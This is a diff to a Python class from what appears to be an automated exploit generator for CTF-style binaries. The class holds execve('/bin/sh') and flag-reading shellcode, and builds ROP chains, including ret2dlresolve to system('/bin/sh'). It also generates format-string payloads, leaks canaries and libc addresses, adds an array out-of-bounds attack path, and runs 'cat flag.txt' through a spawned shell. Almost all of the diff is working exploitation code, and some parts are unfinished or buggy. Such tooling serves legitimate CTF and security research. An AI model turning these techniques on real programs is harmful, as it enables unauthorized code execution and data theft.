@@ -11,10 +11,11 @@ from rage.log import aegis_log
 class Against:
     """Class for dealing with exploiting the binary."""
 
-    """ 
     # execve("/bin/sh\x00", 0,0)
+
+    """
     shellcode = asm(
-        movaps rbx, 0x68732f6e69622f
+        movabs rbx, 0x68732f6e69622f
         push rbx
         mov eax, 0x3b
         xor rsi, rsi
@@ -22,7 +23,6 @@ class Against:
         mov rdi, rsp
         syscall
     )
-
     # open("flag.txt", 0)
     # sendfile(0, 3, 0, 60)
     opsf_shellcode = asm(
@@ -60,6 +60,8 @@ class Against:
         self.port = port
         self.debug = False
 
+        self.delimiter = b">>>"
+
         self.flag = None
         self.remote_flag = None
         self.flag_format = flag_format
@@ -75,6 +77,7 @@ class Against:
         self.process = None
         
         self.format_exploit = None
+        self.array_exploit = None
         self.chain = None
         self.padding = None
         self.libc_exploit = None
@@ -83,7 +86,7 @@ class Against:
     def start(self, option):
         """Return the running process to a binary."""
         gs = """
-            set context-section disasm regs stack
+            set context-sections regs disasm
 
             b vuln
             finish
@@ -114,9 +117,23 @@ class Against:
         write_gadget_address = int(write_gadget.split(b":")[0],16)
 
         reg_params = self.machine.reg_args 
+        reg_size_1 = self.machine.bv.arch.regs[reg1.decode("utf-8")].size        
+        reg_size_2 = self.machine.bv.arch.regs[reg2.decode("utf-8")].size
+
+        #aegis_log.debug(f"Reg size 1 {reg_size_1} Reg size 2 {reg_size_2}")
+
+        reg_size = 8 
+        if reg_size_1 < reg_size_2:
+            reg_size = reg_size_1
+        elif reg_size_2 < reg_size_1:
+            reg_size = reg_size_2
+        else:
+            reg_size = reg_size_1
+
+        #reg_size = 8
         index = 0
         while len(string) - index > 0:
-            rem = (len(string) - index) % 9
+            rem = (len(string) - index) % (reg_size+1)
             reg_gadget = self.machine.find_reg_gadget(reg1.decode("utf-8"))
             if reg_gadget != None:
                 for reg_gadget_str in reg_gadget:
@@ -131,7 +148,11 @@ class Against:
             if reg_gadget != None:
                 for reg_gadget_str in reg_gadget:
                     rg_gadget = p64(int(reg_gadget_str.split(b":")[0], 16))
-                    chain += rg_gadget + string[index:index+rem]
+
+                    write_str = string[index:index+rem+1]
+                    write_str = write_str + b"\x00" * (8 - len(write_str))
+                    print(write_str)
+                    chain += rg_gadget + write_str
                     instructions = reg_gadget_str.split(b":")[1].split(b";")[1:]
                     for inst in instructions:
                         if b"pop" in inst:
@@ -147,7 +168,7 @@ class Against:
                 if b"pop" in inst:
                     chain += b"C" * 8
  
-            index += 8
+            index += reg_size
         return chain
 
     def rop_chain_syscall(self, parameters):
@@ -189,7 +210,7 @@ class Against:
         """Return a rop chain to call a function with the specific parameters."""
         chain = b""
 
-        reg_params = self.machine.reg_args
+        reg_params = self.machine.reg_args[:len(parameters)]
 
         chars = [b'A', b'B', b'C', b'D', b'E']
 
@@ -198,6 +219,7 @@ class Against:
                 reg_gadgets = self.machine.find_reg_gadget(reg_params[i])
                 if reg_gadgets != None:
                     for reg_gadget_str in reg_gadgets:
+                        reg_addr = int(reg_gadget_str.split(b":")[0],16)
                         reg_gadget = p64(int(reg_gadget_str.split(b":")[0], 16))
                         chain += reg_gadget + p64(parameters[i])
                         instructions = reg_gadget_str.split(b":")[1].split(b";")[1:]
@@ -206,7 +228,7 @@ class Against:
                                 reg = inst.strip(b" ").split(b" ")[1]
                                 if reg.decode("utf-8") in reg_params:
                                     index = reg_params.index(reg.decode("utf-8"))
-                                    chain += p64(parameters[i])
+                                    chain += p64(parameters[index])
                                 else:
                                     chain += chars[i] * 8
 
@@ -214,7 +236,7 @@ class Against:
                                 value = int(inst.split(b",")[1].strip(), 16)
                                 chain += p64(0) * (value / 8)
         
-            chain += p64(self.elf.sym[function])
+        chain += p64(self.elf.sym[function])
 
         return chain
 
@@ -251,13 +273,15 @@ class Against:
         
         pattern = re.compile(b'.{5}\x7f')
         match = None
-        while match == None: 
+        attempts = 0
+        while match == None and attempts <= 20:  
             try:
                 output = p.recvline(timeout=2)
             except EOFError:
                 aegis_log.error("Could not find libc leak")
                 break
             match = pattern.search(output)
+            attempts += 1
 
         if match:
             leak = match.group(0)
@@ -301,6 +325,8 @@ class Against:
     def rop_chain_dlresolve(self):
         """Return a chain that dlresolves system."""
         chain = b""
+        dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
+
         return chain
 
     def rop_chain_open(self, file):
@@ -315,11 +341,6 @@ class Against:
 
     def rop_chain_write(self, writable_memory, fd, size):
         """Return a rop chain that writes from writable memory into fd."""
-        chain = b""
-        return chain
-
-    def generate_rop_chain(self):
-        """Return the entire rop chain."""
         chain = b""
         return chain
 
@@ -344,7 +365,7 @@ class Against:
                 response = p.recvline().strip().split(b".")
                 if response[0].decode() != "(nil)":
                     address = response[0].decode()
-                    response = response[0].strip(b"0x")
+                    response = response[0].split(b"x")[1]
 
                     canary = re.search(r"0x[a-f0-9]{14}00", address)
 
@@ -358,25 +379,41 @@ class Against:
                         self.libc_offset_string = offset_str.split(".")[0]
                         aegis_log.info(f"Found libc leak at offset {i} with {address}")
 
-                    try:
-                        flag = unhexlify(response)[::-1]
+                    hex = [response[i:i+2] for i in range(0, 16, 2)][::-1]
 
-                        if self.flag_format in flag.decode() and start_end[0] == 0:
-                            string += flag.decode()
+                    try: 
+                        new_string = ""
+                        for val in hex:
+                            if val != b"":
+
+                                flag_char = int(val,16)
+                                new_string += chr(flag_char)
+                        #print(new_string)
+                        # start end [ 0 , 0]
+                        # first var is if the first part of the flag was found
+
+                        if self.flag_format in new_string and start_end[0] == 0:
+                            string += new_string
                             start_end[0] = 1
-                        elif start_end[0] == 1 and "}" in flag.decode():
-                            string += flag.decode()
+                        elif start_end[0] == 1 and "}" in new_string:
+                            string += new_string
+                            end_index = string.index("}")
+                            string = string[:end_index+1]
+
                             if option == "REMOTE":
-                                self.remote_flag = string 
+                                self.remote_flag = string
                             else:
                                 self.flag = string
                             break
-                        elif start_end[0] == 1 and "}" not in flag.decode():
-                            string += flag.decode()
-                        elif "}" in flag.decode() and start_end[1] == 0:
-                            string += flag.decode()
+                        elif start_end[0] == 1 and "}" not in new_string:
+                            string += new_string
+                        elif "}" in new_string and start_end[1] == 0 and start_end[0] == 1:
+                            string += new_string
+                            end_index = string.index("}")
+                            string = string[:end_index+1]
+
                             if option == "REMOTE":
-                                self.remote_flag = string 
+                                self.remote_flag = string
                             else:
                                 self.flag = string
                             break
@@ -412,11 +449,21 @@ class Against:
         aegis_log.debug(f"Found stack offset {offset}")
         self.format_exploit = fmtstr_payload(offset, payload_writes, write_size='byte')
 
+
+    def check_bad_bytes(self):
+        for byte in self.exploit:
+            if byte == 10:
+                aegis_log.error(f"Found bad byte in exploit")
+                return False
+        return True
+
     def send_exploit(self):
         """Send the exploit that was generated."""
         self.exploit = self.padding + self.chain
+        self.check_bad_bytes()
 
-        if self.exploit != None and self.format_exploit == None:
+
+        if len(self.exploit) > 0 and self.format_exploit == None:
             aegis_log.debug(f"Sending chain as {self.chain}") 
             self.process.sendline(self.exploit)
             if self.has_libc_leak == True:
@@ -430,9 +477,18 @@ class Against:
             if self.debug == True:
                 self.process.interactive()
         else:
-            aegis_log.debug(f"Sending format string exploit as {self.format_exploit} {len(self.format_exploit)} {len(self.format_exploit) % 16}")
 
-            self.process.sendline(self.format_exploit)
+            #print(self.array_exploit)
+            if self.format_exploit != None and self.array_exploit == None or len(self.array_exploit) == 0: 
+                aegis_log.debug(f"Sending format string exploit as {self.format_exploit} {len(self.format_exploit)} {len(self.format_exploit) % 16}")
+                self.process.sendline(self.format_exploit)
+            elif len(self.array_exploit) == 2:
+                aegis_log.debug(f"Sending array out of bounds {self.array_exploit[0], self.array_exploit[1]}")
+
+                self.process.sendline(b"%i" % self.array_exploit[0])
+                self.process.recvuntil(self.delimiter)
+                self.process.sendline(self.array_exploit[1])
+
             #if self.has_libc_leak == True:
                 #libc_base = self.recv_libc_leak(self.process, self.leak_function)
                 #chain = self.rop_chain_libc(libc_base)
@@ -455,10 +511,16 @@ class Against:
         """Return the flag after parsing it from the binary."""
         try:
             #output = self.process.recvall(timeout=.5) 
+
+            # Just for safe measures ofc
             self.process.sendline(b"cat flag.txt")
             self.process.sendline(b"cat flag.txt")
+            #self.process.sendline(b"cat flag.txt")
+            #self.process.sendline(b"cat flag.txt")
 
             output = self.process.recvall(timeout=2)
+
+
             if self.format_exploit == None:
                 aegis_log.debug(f"Recieved output {output}")
             if b"{" in output and b"}":
